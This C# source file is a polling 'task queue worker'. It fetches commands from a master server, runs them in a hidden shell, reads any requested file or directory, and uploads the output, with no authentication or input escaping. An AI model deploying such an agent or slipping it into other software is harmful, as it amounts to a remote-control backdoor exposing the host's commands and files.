using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;

class TaskQueueWorker
{
    static void Main(string[] args)
    {
        string masterUrl = "http://localhost:8080"; // Update with master's IP or hostname

        while (true)
        {
            string task = GetTask(masterUrl + "/getTask");
            if (!string.IsNullOrEmpty(task))
            {
                if (task.StartsWith("execute:"))
                {
                    string command = task.Substring("execute:".Length).Trim();
                    string result = ExecuteCommand(command);
                    SubmitResult(masterUrl + "/submitResult", result);
                }
                else if (task.StartsWith("browse:"))
                {
                    string path = task.Substring("browse:".Length).Trim();
                    string result = BrowsePath(path);
                    SubmitResult(masterUrl + "/submitResult", result);
                }
                else if (task.StartsWith("executeInDir:"))
                {
                    string[] parts = task.Substring("executeInDir:".Length).Trim().Split('|');
                    if (parts.Length == 2)
                    {
                        string directory = parts[0];
                        string command = parts[1];
                        string result = ExecuteCommandInDirectory(directory, command);
                        SubmitResult(masterUrl + "/submitResult", result);
                    }
                }
                else
                {
                    Console.WriteLine($"Received non-executable task: {task}. Skipping...");
                }
            }

            Task.Delay(1000).Wait(); // Wait for a while before fetching the next task
        }
    }

    static string GetTask(string url)
    {
        try
        {
            using (var client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }
        catch (WebException ex)
        {
            if (ex.Response != null && ((HttpWebResponse)ex.Response).StatusCode == HttpStatusCode.NoContent)
            {
                return null;
            }
            throw;
        }
    }

    static string ExecuteCommand(string command)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = OperatingSystem.IsWindows() ? "cmd.exe" : "/bin/bash",
                Arguments = OperatingSystem.IsWindows() ? $"/c {command}" : $"-c \"{command}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                using (var reader = process.StandardOutput)
                {
                    string result = reader.ReadToEnd();
                    Console.WriteLine($"Execution result:\n{result}");
                    return result;
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing command: {ex.Message}");
            return $"Error executing command: {ex.Message}";
        }
    }

    static string BrowsePath(string path)
    {
        try
        {
            if (Directory.Exists(path))
            {
                var filesAndDirs = Directory.GetFileSystemEntries(path);
                return string.Join("\n", filesAndDirs);
            }
            else if (File.Exists(path))
            {
                return File.ReadAllText(path);
            }
            else
            {
                return $"Path '{path}' not found.";
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error browsing path: {ex.Message}");
            return $"Error browsing path: {ex.Message}";
        }
    }

    static string ExecuteCommandInDirectory(string directory, string command)
    {
        try
        {
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                FileName = OperatingSystem.IsWindows() ? "cmd.exe" : "/bin/bash",
                Arguments = OperatingSystem.IsWindows() ? $"/c {command}" : $"-c \"{command}\"",
                WorkingDirectory = directory,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processInfo))
            {
                using (var reader = process.StandardOutput)
                {
                    string output = reader.ReadToEnd();
                    using (var errorReader = process.StandardError)
                    {
                        string error = errorReader.ReadToEnd();
                        process.WaitForExit();
                        string result = $"Output:\n{output}\nError:\n{error}";
                        return result;
                    }
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error executing command in directory: {ex.Message}");
            return $"Error executing command in directory: {ex.Message}";
        }
    }

    static void SubmitResult(string url, string result)
    {
        using (var client = new WebClient())
        {
            client.UploadString(url, result);
        }
    }
}
